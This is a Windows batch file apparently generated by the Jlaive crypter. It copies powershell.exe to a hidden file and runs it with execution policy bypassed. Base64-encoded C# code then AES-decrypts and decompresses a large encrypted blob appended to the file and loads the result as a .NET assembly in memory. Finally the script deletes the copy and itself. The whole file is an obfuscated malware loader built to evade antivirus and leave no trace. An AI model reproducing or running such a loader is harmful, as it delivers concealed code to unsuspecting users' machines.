@echo off
echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "%~dp0%~nx0.exe" /y
attrib +s +h "%~dp0%~nx0.exe"
cls
cd %~dp0
rem https://github.com/ch2sh/Jlaive
%~nx0.exe -noprofile  -executionpolicy bypass -command $UBNBPC = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);$dFSEeQ = $UBNBPC[$UBNBPC.Length - 1];$EjOCko = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dXNpbmcgU3lzdGVtLlRleHQ7dXNpbmcgU3lzdGVtLklPO3VzaW5nIFN5c3RlbS5JTy5Db21wcmVzc2lvbjt1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5OyBwdWJsaWMgY2xhc3MgZUdjRmd4IHsgcHVibGljIHN0YXRpYyBieXRlW10gYmlITmlpKGJ5dGVbXSBpbnB1dCwgYnl0ZVtdIGtleSwgYnl0ZVtdIGl2KSB7IEFlc01hbmFnZWQgYWVzID0gbmV3IEFlc01hbmFnZWQoKTsgYWVzLk1vZGUgPSBDaXBoZXJNb2RlLkNCQzsgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsgSUNyeXB0b1RyYW5zZm9ybSBkZWNyeXB0b3IgPSBhZXMuQ3JlYXRlRGVjcnlwdG9yKGtleSwgaXYpOyBieXRlW10gZGVjcnlwdGVkID0gZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soaW5wdXQsIDAsIGlucHV0Lkxlbmd0aCk7IGRlY3J5cHRvci5EaXNwb3NlKCk7IGFlcy5EaXNwb3NlKCk7IHJldHVybiBkZWNyeXB0ZWQ7IH0gcHVibGljIHN0YXRpYyBieXRlW10gQm95QnNVKGJ5dGVbXSBieXRlcykgeyBNZW1vcnlTdHJlYW0gbXNpID0gbmV3IE1lbW9yeVN0cmVhbShieXRlcyk7IE1lbW9yeVN0cmVhbSBtc28gPSBuZXcgTWVtb3J5U3RyZWFtKCk7IHZhciBncyA9IG5ldyBHWmlwU3RyZWFtKG1zaSwgQ29tcHJlc3Npb25Nb2RlLkRlY29tcHJlc3MpOyBncy5Db3B5VG8obXNvKTsgZ3MuRGlzcG9zZSgpOyBtc2kuRGlzcG9zZSgpOyBtc28uRGlzcG9zZSgpOyByZXR1cm4gbXNvLlRvQXJyYXkoKTsgfSB9'));Add-Type -TypeDefinition $EjOCko;[System.Reflection.Assembly]::Load([eGcFgx]::BoyBsU([eGcFgx]::biHNii([System.Convert]::FromBase64String($dFSEeQ), [System.Convert]::FromBase64String('bM5SLwARBHNVxkPkGH7dkiyGULdAJnRuskfz5hMZtSA='), [System.Convert]::FromBase64String('JxbmJdzbj9zRIa6AuOnlMg==')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))

attrib -s -h "%~dp0%~nx0.exe"
del "%~dp0%~nx0.exe"
(goto) 2>nul & del "%~f0"
exit /b
lhAyebtRIxs0Cnta8uph9F1guuKyLbUaxajo4HuuUyIPrcdAMUB66MFeM1xSQSW8f1tL3Tcs8NQZU5oWJfSUg8TRFiO1urIYKupgKK29EZmcK7L+3Fy/PhtaXJmY/tfJrEEL5TLlMT8Xh2Nl+rcfS4Q3xhsTjaXJvcM6gtfAqE6FgCXRVBevGap3Q2+2y4mpl3xDSneOzo+guz3Agbpw6yCDshwv55qYHQsa+qTBJyw5wjFC666Zl/qz0LrLG57p9ZkTHXU7TLowqeGl9qeTZoSc2Iol7F/bzC7t6Z7NsZaqTi4HxNR5YQfMI8gwPqKWwVsmjlmkTyfOJcHZDmiI58YmXZOpDGXbR7PPyQ3LhX0XQcDnWCptRmVaHeBwAIWNgZevUuAVlmExJ9Un8+9OSFjMEOd1QYhjQWhxV8Pflv2O/d1bqyLWtcVQvhKyHzjKhoA8NRJsDsUPEt9Djjf9//y+bNzwjS1uUl5q9WY44XAhH7zBsj5OMwUhrjdkPQE1KPW2mibzLphDBZy1vQ5GCI7slNxUjaSN7pfflMoZPxRES9an+e5zDrZWM9xHqga1etwOURrsFbMu1iDO/9g/3b6c2QeVvosbmxQyeUaS2mMuddi3NPHYMx6okWDsDvgCmmF2jTKLmJ9yznRFb59pMEqozMiBjC+IGbP0N3g+YTK30LmFsoZl8zH6JTP+kwRTz7aUWSfxmTH97bViLznpqm8v5UvNfB9SfzQch9uk5tLvC33oCWtoF7y02sO4DlzEypMBWyqzBTYgrDvQ6Gl3IPdUrJM7/skrP0DXRWHl/iwdUmqflGx4fL8xZ8kzGyvEC0RMlMPK9Qrxv/NZ2yrHMwx5PS8wN8wOUIoHW3srfFHKF/VQXFPG9l0Z3bXhSvseDk2PYtIfF8iIdZVb61HKHexsSna8KcGaQLqKt80ms1h4yBzPqQ5Uen52ttLt6TSEP4brcXnrdBmfFAQX5149fR7H0hprsFBDwBXEFjAE9nyOkkb4kXTuYO/bVCld1CKaEIjL3y1e5mQtYSR0smzU2634GbFTy5DgSkxzibXuDCzwQIsdaZhCdA1BZdiH0nAbiURVTSxak/kseu9SQdQ+q3Bc3F08vGDE2v7iObyiQ3GhiLP9c+22IEvclbMZ+F8+854Qy2wgVXOMnZnILAvvtAjMH9MDU99QEUiGg+ArZUd8h9QBAS5P0PtYA6Xm0KOEVzcpj4bshfQmDZ7V5C/IUGuIJjclxBADc9kcbmMqgjOH9d9Gk69Lu0VoWn7+FjzRvVFL7uacck4WZ3ytBDOapc5qEdkNMc8vPR64oI8fJQMAhHH7ZWlIOhJiYWq+OjjyCZBbqjGZPa/Uc24Oi/oVWx+DpldLX6xboxxHs2+q4QC5s2hltKQKswDgBvL5+ZVQlgIg2ZeIskBaJg9eud0TyHRonDwTOaC6PJEHpP832bYgI4FTF9LSDP79/gvoxll1MLABRvldqYbaVy13cr4yK7GxMvasYLsbQrJ09ip8JRcD+NvoSu9ZNt6Mcium+ZGZeCPOPDue1nCD/QHLqXhy8wfv6u4Qvm80kX5TUnzg2A6sjAvPzRSjxLT3FSYp/k+O9MPaJ5BhwWYGFJ5+Ict2+3Vm5gf227LQB594XM0Iq6t36C8GYKl1wo26xItjYnUCJ5QMcwGlj0Y9R6GDySALEqWrgETIPP4G+xF7gRR6X7EuRf5w2YgkzfwLWRUYhtsbu7JRoz7hRMZ3rdpvbaNvay4xQNpO12Q5kVXNfnUZRB79Pc9E177m8cSoViED8if2kGG15JDb1b/egN4H4HIYCAvDayYmbvvKlu1IoKaCbWDhr7O4qmyWCT3mxaCwgT5bMCr4Q6Xoc1XJ063ZQLjg4yrLldoC3ilIZjMonN7odms7OnAIipk/+hKZAwyQn3a6e1md2K8zV0+l9CWZ+ROQQ7q+MD6cV4ghlKXSmLdheMXQZOuu8bofRzH3b12kgG8NGNgSTrAARQm1wRs4yapzNNPx+1OAAfU6w79zspcwfnFfxiVPM1dOyBssJCwFeTwphBGlXIcEblpIQ/uvTlrsUinvWVqmgjbwH0KWbc09tqczf4ZfLMxmlUiYglQtD3zzDIuzH15nNqRZHXV900GaHr45sizAfrmfqZs+bu2ksjfBs4K3BC4mtiI70JILlzyz+SA9+j4JTniw27/TtLy9c1RYjNHhpGF816vr1rIiAUqO7E3MtRF5rlELDPaU2JFv8aFUJGeUD3UVdDPVZOr9+2dihi33pr4vZNj0WTcQ8KFb72xhv4r2RiOFxp97v1FDLjyWim0z1mGGmlT6qYRc/myNeQAiPeAKM2skk4Jq+/Kp2hfM9ORH+Qm7cKZmjJ1DV+XWopiGwP00hQE5c+QtTeiNLePm3EftGcXJouYI2M+8Fll42aAY+3klcnmFN9C9lo7V6njR06XI1tHyhv0A1jy1urePSiwowWpbW0oxgopU3qLYVMhx4Edm7ZjmHU1aIQlz52Bvii7H0kzs7CZTJVzCq0lArnN31fVkf4djth2fihExCXjhfAx/ZwxLOzG3E/fGf++VpkiMQN2ITHwExi8c+V4k0HW1ogkhpnr8C52uSTk/lCL+eokQYZqXAT7UCyW6DutbjNQD7Q7VEbqhZ44s6BwUwMbUfNl8mVwFIdwadkwY+esjCMpv9IQF8Xv0OTGcf35xhxhOWHT12osD8+x6Wd4zGz8EAxfXMle5FPlt+2w/qmXA+P9CJm3l6HNM9S7Uf14WjqCZonwmJd/j+iIuP+p8gflNrCnWGenNN8yP2vbQfV0PnAwtLjLe08UTqzZJegBeZDJJoLsQQh9Y5a6lCIIJG1dsvSPL4dPo2hDzEt9L0pD+lGR3jmuj/ChG7yDD2WEk/XuuO8iH1TwXVOmLOUGdx6Gl+IV/ft7cTTuGcWaE3dDBNkZlyfzBT99cltObmdoH4YMCpxLbkznErHpTK+MIqxMdsTjzhpF6igtgpmXicUwdC2ojo3Gm6ru8fgcVNyxu2ytL18gcH7yxid1fkkl2CpZhQtOPZR1KSAVt9gUB7uQbEj95ASoVCPvcxWHsrUi4OwDogiB0i4PMCxPH/MlhV2uGJ2KdOeDb2Dpn2EeL4BnM7enoTc9Wyru6ITD1NMFt6cK3EzAsBhsksuuXY6AZRkAeESbQOY1ebumdK6jBDitLOgOsMuNI86CZlfooOqswPYqrcFDMtn6aucK4h5YGw+Tdjmn90WCG8vPwzLDxNfi+OToaJxc8sc09lbxvaxMS7tIIzFxk/a1CMkuwJ8KfxHYUEiZ4Iem3eBsmlrw10BCZMvUpFRtuYTSHUAQ5qRLCBfJd+9rAYhSzp45lnF3Vrxl9i2VTNlNRCUklzHAuKxM2Oao5s+A1k/4acmvoOGh3u1XrqYysC/TUxNbETCX4NHOY+0AXi7Ej3m4X5+psRoVVcVpPDCCqTDV1ysi2AiqIgmA+4PG2sfEGl645So1YIKijOsNw/LoDHk0ZavzHyc8C5sAlUz+HTUyNfKVELdM07rZ2whr9iPYtqGU/dFijMLhbVbA0YLo4V7y8ovfMJNxHlAJajIalfM7MFffbpmC6H6rfxRu3F/0af5YA2oG9/XqApxamGGMBPWkMSxrHSo6BWG+0VrfxM+4J9/TrampNI1kfkWL0VGTL8F4l9ZlbSpUM3ezwyC+b2DG3ZebQK740HzQVEGUDZ5DkherKGtBmoowCqE7eHOrmJBvUHNlVTpcTrqINWRPdIs7jsK4knDZurwelkV+jRorgs4OTJHd2DJpVeVFNrHwSUkoq7LB/DOyn5XxFQE/CGaiS+7KFB1VGvJYs0Z7RYO31Z+0a7Ts7WIv3EuPQPCIKGfGWyjWbkSmkdt2pGl7ToPIzW5GG1p+Ha1WagZgR6CUCn21n/Qj9KQIaVvxxkS5XxM3ole2N9oT/nyyeW4H3hehPpwGX1SpFj+zX+tA87h0auRecjgy4sawwjwQ45E6weHuAr1XPR1jjJ6M23VcuiT70jVbO2s1akBSy+qhl/p4McbJFS0iJ1X4W2WXGtj7xRP4vxpFSnXmREoEUP6QNDVt0IMFFs53j150S24AWhncoNY2KqLQs4eJ3AZTFpsSDt4dHn/ur7se59QcWLMgjg0rb1UHyT5r1YSxCcQz48oTRY03d+295SLcN5bCnRX/4an4OY8x2jZX8yxgSV1cZQXORxjoJIxOhF4IKVzGZA4X8b45qdn5DvcQ3tOlPmd4zrcE6GSoWmCTMbNreA+x0qK899iQQeP/ZZ6QIV7uftQdW8HckQ0k5BFudP5Vc3y4ohzuvTNziNbpKJqtfHXciSuxrWy446N0J3iWOnKEy9DQkrMaOhRfsKx5Nl3HELaxdlkaT8V4G4AgM9BTRt14TuJ9qrKW5Dxjk3mzCFxsuAhlRqg3W5HHGvngc2EiGhxn0SvvNFEMrqz3YR/3Tkuy201XzGmBiVX941JvTS3nLG1fTo645y8BSmtd5o/dNx+oB0kV+KnlDb7/B2XiRzdL75sLPp8lF7oIWz3iA1+2ODiYQiFrJWUF4NZZZZZg+0BqE6auJMdhX6TIQTmZS2zPvHG/kYF5tgMXyIyiMilvYxQ+3rTAZEFtn5zgI9/ihPIsowNH2jngJvNjY6afVlvhIctevi+RC+3CCSeiuN1AbsoOPa+FzNZqSj7lrYK5VJQ+zyGH5BWh1+c08zRk0C8YdAJ9UeL619aoj4CEnQjDsqVDEJdYryOaT9ZLg+53+sJn0ax4oWWEgy76aCLhKWdBHd8SbLFYAvMcSaKiwmsWOgUm32I2CoYkglGFO/DLjZWiy7IpLmejkouxCS4JD8vHA4O19yShAV9m+dtVc1XIvzkyVgUO3OSXLPIOGAPqJCzw7UFQM+fXZFJEQvZutW0Dfv72Kxat/4s1sDaFgo7R4W8GtPPvpWUngHr26VxxCLPYUieP5tp1Ontjq++gKSRGwNJWO3cW5CbgA2kc7RyGuSChD4n1R9tmVL3WwsKxAHLncTL8RF3oqMj59SuRAvImvplyd9e2+IGp30mPKpbwcpUaVBtB9lldRN1LyqwnBuAmkx/Hh5Vlk/EWZ8tUAN47uJEnwxl0HWxRWepOmjyFqoE7zKlJuIh6Y/qRZsCeubl5SQhJFTy2Wox8YsrHMfDFbWljRogmcEFGepSgHdZ4VN7JAkIWQOTeNeR3NJBZ25Xk3AZpQcfvSrf/gp0LhrbStxX5sYUdHO9dTpTZ3iTNozvWVzqOp62nCObEqZRKQSU0XJKSavdbRg8C9J0xbUzRyeZ69PkX79GWfbRKSTKgPbJu7BZz05U1Rt7GoExhXV0raYVepnhydmLl02p6L7d+DRmdnUjDk//57v0c16lzlvQM789S54m1UkeWqHZityyCDW6M9BLvEj3qIWbCyNTHhbJcwBuc7nVYAVbdCFMuCcdE8M5AKGbqUc3xUBM2f1/ZPL4oSO9SfucYFpjbG5ket7vTDvS1NJSYsqTIWKPZbfg3k2CfH6OvH196oV7zhLgdpW9HXXWRu2+679TKe1de9SaG9UT9qO/ftDt12HAsyFITf7bn1H32zkmtBMHqPu8QNTI08/ifsP4dChwViYmA0AIS5HGCkKu4npDRneyNLGdKirDM3Hb5JJsphHFCiHU1tLazEzHhYtKcjH5dCTCpv25+Wdtds3atm3ITagUy/F9cMmzoXpk3FQk9MfyqeoASg6wG0CgtklBltwssFsgzP7E3/Vr+MC3y8D4a1fqy50Mg5cN6ArLKVFnsQg3p1fKibIessQwCq+kRai1CecClgSwN5Ipb/sPSN21hHP4YZMPn0wv2prIdqng3QKzE0SvpzmIf9CzE/tl7oWDaLH1NnKzsdSycxEOLOQbJeentAgqv3mEywLmqTKOX+3276Ku3YNAlL7qexrt0hfgdy5OXZ/DNxFEZwEdJxMJOeTxBHWZIYCJqkpPKGkAoaJfLVmqn3JGCELg2LL+NW4e4FQ5IxV7QI17iAl6b5iIkzEmTO2WMHnObuez03yn7pAo6gyDlNm3/G8+fkXHDxa2XS83WxFoOKjNwuMqDt0h5vdeqmZZSV9YjDM2kX1SCOQ5nWwEx6uNmbekW6hKVD4LRvkkem7IP211VOoO01cxWpfbFU5qN+8Z+GZyi9VhNBfE0WkYlCGzwa5un+fBsQ5Vh/xnAVebVUNi57LYk4fRRIRG4uDbO0kley6vsRW+RWM5mtdrZOoDzVVe34pHxJBVqWuJFR8hPgpxT14hPumXA+7wqGiibyOp+vRBeeOGflAsVaYUeTh0/ZJZAmac6iEiMKJ/7eN7W0aC7k9EnI4mX4D5bMIIJ9LNpAxLTloNzP2legoh/HjgiXR2jrj7Or6O/18ZmcIohn5l57STW0dReocsk59gQ6NWwrN+mqjdomwtvvcNCUCpJG9R/n5Oo8mebXDRo7PDx/rEqtvCZoNYLuY7uIcwl+kY051bYl/6i8McRA3JdgTMI5tunE0QBChWOgSt0AM+v2Qp1jZtX1OW76QFp38+7sjGj5wl043AN8hKYXmogQvhfFMp8g7ZvuDYuMZzP0kAzNc4eOdEo7gYM1UXfstP3rWMfK2RUphW7jKa5YivaT0cvlik0QZigNa8X/8Sntn5irZzOkvaAhqMmrMZj8gKivtPskNB3lfDaUdDE0n82Bzm71CcSxZL+1HXMKlAaIUElCHeCOvvSJaJVXibVRK++Kukx+KlqzVe3WA8YHH4p5/BiFhwwlkCQcwnvAp5JmUYbVBy29EGtktZQ8nrKjQdfcxhrnyURIZO3g9mLOCcmVu9+NioXmfnMrYsIxjs/SgbnnLKu8cfcRJi3+oC5CgYL66k9XwOVfLApPNDFEdQkpVCxLATTk1uGiu9tz5zEel9NoZXpAHUIcN7pClfobTbldRna4T4ibv8zWH3VKPo4iKBZo0fhqqUssEjUImhewYp2tAY5Q3oCOHqX35fdvCrMN6SmO0kr3gk/BOUvpIyVxV/2fT4urjNFsMTX5dFSag0bLERq6dGCcjo8lVYmrJ0/Oa6YZviY3zeFD+uVBncm1+Our6inoy9j8bGWuHZilLekZzWf1758Bdo00QKaJEKJHhxJwJXdJuIPNsNj2BgiXbNPIYVWhP8rp8ga764UgaCugxbiPm0axrtM/5mN6NYZ24fp76VWm7WgQLZVWzzB3h3DEH9sbQ6KZi4b/G+ifrh/TYwqZj9xYPOGk0AyAqZpI0ZC3OH2uixj41zljMVMFL9RZlNWjBcvyix/js0A54DzbBW9cIE1Q9Cc7VObTKg+9SdKXMhx7hNeFkKWR/9+dCZ1p3WXEjE2DzpxhdzcoDI5O/k8vRZvV5j2KhCGdZgEYRj3lsnNHJcszCI+KqyhSngDFz8E61VChtlGBH9hnRvL+Be5hwmQMFXVuidvglCddrRab+YCvW7waGJ3d3STQXnrHMFEiCnEkrplEiJbs+9uzyP246WQ6klzodMN8MiYKQE2BrPCGqJntQIpl4n/p87UPl16hSBAB1uZO1mrfE4bi8dsud2nH5oeF/R0lN2jamxXWzFEjSIy3ld8WVAyPekSAumJ2nCh1i7gkEk+8X2NN4y7MdK9B6fpAbCgXmNSu/pvn7RlSoidBmlToSnLet66B2omvTn7E9TEtuMi+xKulKYm8xud9vkSKRiF04BDxI2dtvIwrfmniueo/ebXxatxrnNGzMQF4rUESkYkDpCNwyMyy2kgS2AGR2cKAzSagNngvOg315Umfni2QoMbp5OL5CuoqAJNlfl8LYaOJ6FMIAL3yTjAI0qbQxUvr9Wgy/MdrizyhzAH8rgY1qFbepiYl0OVBEh/9CK4hqN9sEJ8eJV4WOZVFawEmK1B65+5V+3tFbGOrlI7ywgRfETpqlbPnMMeAuKPCoGBwHnEu667Dwz73n6D0YAWA3FZI7SrRotCHRUoo7A7FnSzqLlk+bkQplSSs0sNaYEyx1qCRDvzeSx3zcvz2zgCTzqYWfswp0+DzYe+udFHVmmXuMDx1te1NfX3OPAdbVO1Yec/vx2z2QSYtitgwzlF5sRKdvFhIcwOUNDL/w4eKQ0pSP+7kRcLqadrKv1cvuukvdvKu4m7fmJsMW9+NNLo6mddXmbhYvhK8n+CkUdcaGcYJ2xbyVMpMhbRwuinokc66cxxtoJzIh51T64auZxeq4BYa48+UoWybVYL7G8DHft2K+u6hUCj7zTis1SlCqeBm18i8uq3c95tQmqbg9+Vfs880yoCJcyKsFFYYyTz+jHrrWWhNzAeVHKNzyv/fCbzC45FjX4bzf2ZSZFmuv6iksKupoMKr9WPDOkX8t/sbXdOiBXdfxIfDA4bHi2cukeGnfg6QIVcOxtIUCUVTvJikx8ZgRNVF/iAyrv02IRM1jcqJl2dvJOfWnLM/4D41w5h1YTBQOMcHuWqwV4n3qKwpkumRRk8hoxvuXaw9Sjja2IWP9PAm4wSNkhPI9gsPgj83AiVjG4FnwgO05xgEzql4RNRN/TD1bfaijp4laXpfBha3N1QECEho3ROGg1DIYnh+kvvUhaOZ2EubCpg/H0qBuNXPHsEcRcxfgoQ6chrFBFK6M3J7ZWWYrMfN4L+und2LoQ2KieZbAENHuw34EVLsQML05F5ipXnRk3UZItG5NvRfChCCK2Tn1TWnLHsZFbg3PStMzOtAe9dhf5NVmEhmqwvzDzWDFcKFhODqnXsTPbB5c98PaTI3MAynU0xx0lfeA2poRziCmb9MFNa1t/k5EjWh3vTXhXsWD7wHH0W9M4WuJTcOWwD6kH3klEPHxbzTCZzZRzK7vVP5yftR9t8nZFVV02iVKOTDmNPG/jAKCe48x68bXMTk64SmHuK/ddg4BOFOzNDmDeQfrpyR0TdKcGPol+RfWkDkWpsVjdnwrsEvzcZg7CZGSNjed+9BsNqXPwo3awkPjdGxMZOHowmF6heYhNeFW9b63snR8QdLV21i4xk7dEZTRFql4bAMSRMtoIrQlGYtkRp4savLWVVZgxh8Erw+D461hLtGW5N/oD95O40FnoP/fg2QurrWEzmT8gJj0c9A0Mb8b1xw9fQqC+uhfePBXFZTce5b4R5Ecb/zq5WS4yzRs/FB/19vFEvo1FR6U9H0Y47IfdWXZrrj/qfmCuAEgfybru+mn82qyudMvNQwtWQ6jU8a6oYRLL3YayfSR0GREjGKk1SMJ9MLWkc+5ny40remet+Ak6tF9EjF27++HUOPzv+wBaN+PsW5MRBTbV9v2X17DelD2JZ9djjGxhzKxnVWl6Jv62b36YRYQnKSNGW58u9N6LZQNzYKaIoBp2cQ6tPGXn/x+wEn5veSPm2jD1DUSsYKtZAmhcLbQTjEl8ZCB4wpyphhAAfodkk/scx98ALR5OhrA+cG2JDBXbjuaYl4hiEQOuH+iFMjhuerXmpRfzp/Sy3GLNj6pQyWZUbTdqxz/V4xWdzb17Huxk1bmEjnaB0MIxmHmT4Qy/6BCpDodNPvFekfPaC4OK1wqkUTuObBVwmNisvnoCUeDcr8mZ+86PdSkBBSd7f4M1FaUteMKZuFAtiyRUbaTpfAtqmkISV+KYiig3XU9cj5a1lQHzkHxzj7O+zRiqPiNx8Vz0jguD6IacHMMcSsTDSvjUHY4r/x89fzxfF2zdgPuewGeGtsz6VAp8lvb2hGpURfcGT0RCxcsMAYq1RXuQAok0iBegeWRJymBtICvBZirGyulSgAlyYJxzlNhkWnT6xOGwM59AMiS4dfNyLN9p23HsrwvC6+1ryAvORGkx/lY+KbPfqEUnT73rrm2goyCt5ALXI+6FF11g+nu5yBXT8d95uL0LVV2ravXaOuwj/fXZyvFfIJYzyctYHoRvaCUCuMUPoWjHDcMyUr5qBIYqLzLavfJFkFzqDLULs1jF0gDqDrlcxfA9sG5EwEzy0mlKHQLbCY379GaaKZ6eCbVQWz1HUGZ4IIZXD4HfVdKshivdiXhORAa0qD3VpryK7Z4MHL4ST1nGtEANoOvu2v4oHflS3V3xix0pYMxluFaCgG4IYNnwHCfKrr9Z/gS86ctzkyT/0aLQEiKMNDj8//MgvzO4zqZETJAWVfDq2HaYkmPI/rNilHRFRmAgbuFBPhm5ARThXzBmMdFiM76aW8apGtMaJdtp6j5UCheE4LqRs8QX1V/ngGf//arjSNA0HbajNzLqxNUHV3WQ3ButB9C1dazJQGH45TaRUwaDJh8eWvPwBNV3eeov73mKC1wbYkcslenk+WGzTav3XMvTGkX+MtoBEbzDeNlBWn1lltqlOdCRtmfTFYw18zZTJ/htvjmhfXCSN4rwdYsjA7XZKulZZIrzMsEBBIc37dTN7RbFh3q5VDB6nQpUOyiO+S0kEiEU0HlDQd3/SbSKxK95+NHyMpKTbUAVtz2POXR0nQ98F6qAIERv6A2ktpxG0LWkxfiVCSTAWJLf3L0YTFbUEBdXvYkAeoSL73S5xi1Hl1tXy7yQZdsjo+Bh7AQ3WlteDPs9ooR9I+LpsrUTbQNHQGPX3zcfKafT6BsixqSD1cjlHkluvcZSZkym+Fncs8RNdxijY3tG+rOdnfWjY/xWLzNTDsBmoNmN7BxCOr5Vvk3J/FVEU7zbezy05iWNFQtaOLMVbKyNBlAg5s8B33eyA21URl/dHJe+uWsfpLne0rviYxXGJGbOkiZjG1u/X1EQ/1sJDt/BBouJ1Anu5dLtcThIwroTzZlqxWAtdu+LpZpGGSz5UaY8J0PrpEsisXpUnog5y7fZzNlp7uMpcpZB+RijkX+9vR6SMnGVQe4JZI7oj5csM5+kvHjnmx9z0V5TBZ/KBOyHfXcPMRX6cHym3meAPpYvHD54fBNa9LN8NY/kCImxcxDxgjFGIMG10rvI4mylrQ0QYo/stE7KHft31XF7238wblHEWaeTiBtX8ABksQZYmety4Xai0h33YOTpwc/ASmZQ7Kdx3ddpU9tFX34Y1wSoW3EEuQsUOdVdurbuFAUhIeAqCbUpLSQfhjBi/9K8Essgj8hd0hBPcifay310Sqg7xJkAc0/Fbq1LbKkrQkeY95q2Dn+Zx9CS8vdIHeXl2UFeNjRrDNBeow5lTSVUBvZFqZud3E+2bUSUGLJyvr+jSDExZ3EyvF3CbTdiwZjBSnRM2OhctmDPLPkDjzQUPH0pN1RaBVa8vmp8VFcMpBdm5LCdMQS9oQ+wlPms7AUHNk615Nf67IZ+5A3KncvUCq/Iz3JTRcGwVROxZ9pz0ZwRsuVKucdWE1h51IeaZ1XLUu1e9u4BfXsGipVvODDAWBgaxAUTVNEhk2+IZMs1cZtMC6kOrvm2DuheU3aMHWKEk0LPCJqmcIpG63FwsnFOvHFQJ1rCsnuPxi/nUovnoDoT0aNgxqWq0awAeJQ8Q0NGJEEL2L7leeWIN6kjygsBu6I/zRGR41jndOSr7svG1Ad33DNoLdWAT+i4/UfMrzBWyywfQz+vIJcUozeU12CrehL5ivv0ydZmOKhr4G+D0LI5MusewjeJJLvEc02CjKmp37QXA4XthMzEFUyB4Qka6lSP4jbsq4m9kAuN2dGdYj5oWLOud80XjwIC0hKUTgfGT7sxfxWHKvNAWQn23MtrhUFtpNJ3a7tbnFmBbm5d2t0Yhrdj0wOFIsI1eFyyJxMsS5iakoJ3nZ4WGrD7Jw+nMW5o4Kn3QxxClq5F8fo3C5ESnqUOMu5ZaVI1ebFRM/lJvXicgvHpJ6f8N4iZlF+D6iGGE9kNcdTT5+fq9poWQBhEruAc8MnTHQNnItDRFu5bbinRez9syUfYMJjTOFvAsJm/yvIfZghHMDNXTEpMeo3x6uZ7Eh7LPFNwEwHjIjbKOB2i6WsKjD4Vee4VhFpzKyXyRH8/2B1/lWCurOT9+qnOjVK4zLgNFC2nl0KBNwEsGZQeZ3mtCYa6FF2bjoLvNCXydDldtxOUJIkIiZ/05ib93HcBWYNDbSxZcyDkg1UP2UEAUJRWT1CsKtN31FIWZlNEcJT+l5XlYxUUyHJplXGEIRPTXGlur7P0q6SXHUD4FPgwwxOL/Lo/+BqGFa+c0JbaLdOY6Pm21lc7JOE78R9B47sPMW+p5zYH1PqZNiDkdsZZYDYEqpnOS63LfroG4tTP7Kaezca0rFq+/4H+ojw1W2OUMJkLiHQK69j6hglCJBDYStOUb9iGjxf6WGfrnrOFCmhe2cDnlnZYkGd4pYALAsB4Fyp7M+kiT+Wl8bs1UJWSjUHR2toUEyI35ZV3/6IDGJ3rwz+OIkliMVzsiY8HrC5kfN9e8NcD9T2NCQUnf+Yx3lIKJuwqlWxvELoYpJg4lP5KmbbKVQhXG7Y3ARzMBCbDaYq8plhizXyo9ADzeUBe3axYuRlODcwOWbyhj9Rb6lesvgQ7QCO24kyWBUYgf5gtmattg3WrjIplo0twTA5BqVe3YjwqRltoO/OX/H7t0NzeNd6bdxIRk/+7TqDjkVBkl3VTMK6gHOX7Hwq96KpKJ56PQ+FNxj2tlwpbjgIu8VobKjAn+TGENnl28Xr3ZWSc1oSqfx8FTyGsgtT3DwphMH6y+XGTN0X1c2hbqrdIjhTerhh9CdDR/XW48mVTXBddwDHk8sJC6Sf/9Q9mwJGgS5gbQIG1Gn7//Fm4/HBqCjSpkNK9NedYPSU+iVFvl2h/F5Jq560BFu/VbpHsBnOIP4VDmo+VgkNvr84BMnkTRBmG3pm9KQa1S+znrNmwtHKyKQZZ5lq9p1OLfMV9oFDQsxas+MGdLfifPmf2eTZPFCp/UvI8fhcYiSunj1N6qi6sQvAsjurJSX2ILB6Qy63TpJedjZbb5inDm/WNGMeu/PXWJaRT0K9xfmWkljgQJnQMCHcLW5SN3szC5sX7rAZ8T6RUBn971NViVdD/ZVzmC6ITpCVNVD1FrSDgDYrxUnrggw7EOwVXZqwRMRx+NxRdFNdvJXUl+YIEfsjkSKEK/0KBbWgb8gctmjTMYs21P4s1pigQ3h4DKe7SaQxhtaSQlxklGYKzqzPqPiUhGQHMRP8ub1WQJ3Q73rpffK5AA6UUSms7ltXri5r42d11uH6elPBGzywelOtcGc3W/xQ5JouNKSdXOymj6qh3114X2yqNgryeBG/pZYIwF6kBDKYsIoiDyLCtFR0Y0JrMQBnEGa9xh0k2/dQIuoNiplhtbGaN8aeNGn1heZUkKMPAoIGD4GrOlL/5cTgoPPc1yi/3U7769aM6SpSV2Ut5AfUpk6k0ImeOSvORDQLhYkrod8UE+8fltWDFy71MUIfXD6/yAjL0p3lKm5dNtYAAwdzE5jfZ00F/H13xg5eL/bf37T/UyTgjyUBITFppgTIYvr9NVY77uZ8cC5Y5R6Jty6xD7uxFrtPO1IMKyKholT5f9hWuNaeSo/WgrU3rtlbQTzCU1EW4B3GGmSNgeAC2cySQuhgmBGjuLpvdUMSQ1/EgMZqIrLd4t02ZkKFNePGI3gskYYq95jRF04lMdIGAPpvPl4GYM5Nf1+wVeiS+hCK5SqbP8W21pOc01T02B9TtrpjVOJUNoHVWKI0N6FDue828G8jnD18gcvZPR3Fenw0zGfxXq3ZCDuwp7P8Ein9R9HSg8Ubp2kUI73Yw3+U56TnR6KtR2vQLokSZ1SF9DsLc2Qnijo81K7hyuToGgbYpIPzrf7atvtLFBnCvr6Zjb6H1ItNpuqj+y/hJgnYKp7LKFSHdtACMiRThufgxxRUbfTvk7tRjivpAB2mSQFzVrkOcv5GLBg2N35mLB+JJlzAEHAAQrZe2Kj2r/OuEpB2/H5a8UVVEtqtGRTiE9ASOkxFRfEiimeaddudFRpJnIYPJKsPd10VVTLSwweVRWQBgSQwdVeQyxA6vF14o7K8o7RjO3L9xL72YJz6ern4+Tg7U9wTzF1XBC53XZNAMgNpFrr8fivoQVqxVSLg6i+hSXYJw0GTlqyFt48OlRglXENm7QTYkKfG0RBjzwNmkA/4GTDcd73FeH3R/Dl758N6BSK30pMHBdkX4i0RAVwW9RC5YkY+2i1vRkaH333iV1uyCBYGak5rUd2Y8PR8RUXYU4+jYVpPbx2ak1gMqKzfI/NnU4C9z8L0cmGEGXwPrgpzEGS77iU7Q+ja0Smzz8/dzrZaR94nZAilQgcao6iUHJrDdOnorPh6sKUBDfmF+vI8XRIBni4GQTo7xf9Q4SCk